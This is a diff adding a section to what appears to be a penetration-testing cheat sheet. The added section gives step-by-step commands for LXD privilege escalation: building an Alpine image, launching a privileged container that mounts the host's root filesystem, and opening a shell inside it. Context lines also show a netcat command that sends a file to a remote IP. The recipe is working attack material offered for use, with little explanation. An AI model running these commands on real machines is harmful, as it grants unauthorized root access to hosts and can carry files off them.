@@ -180,3 +180,28 @@ nc -l -p <port> > out.file
 nc -w 3 <IP> 1234 < out.file
 ```
 https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/
+
+### [Exploiting lxd]
+```
+Creating your image:
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+
+Importing your image:
+lxc image import ./apline-image --alias myimage
+
+Creating your resource pool and initializing your image:
+lxd init
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+
+Navigation through mount:
+cd /mnt/
+cd /mnt/root
+```
+Resources on lxd
+
+https://www.hackingarticles.in/lxd-privilege-escalation/
